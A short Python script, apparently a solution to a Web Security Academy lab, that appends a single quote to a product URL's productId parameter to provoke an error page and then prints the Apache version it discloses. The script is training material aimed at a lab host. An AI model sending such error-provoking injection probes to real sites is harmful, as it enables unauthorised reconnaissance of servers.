import requests

'''

Coded by Kamran Saifullah
https://linkedin.com/in/KamranSaifullah
https://twitter.com/deFr0ggy
https://github.com/deFr0ggy

'''

proxxy = {

    "http" : "https://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080"

}

URL = "https://0a0600ee04ff46d9832533ec008e008e.web-security-academy.net/product?productId=3"
r = requests.get(URL, verify=True)

try:
    if r.status_code == 200:
        print(f"[+] URL is accessible: {URL}")
        print("[+] Exploiting the URL with payload: '")
        r = requests.get(URL + "'")
        print(f"[+] Apache Version Observed at Offset: {r.text.find('Apache')}")
        print(f"[-] Lab Completed : {r.text[1749:1749+100]}")


except:
    print("Something went wrong!")

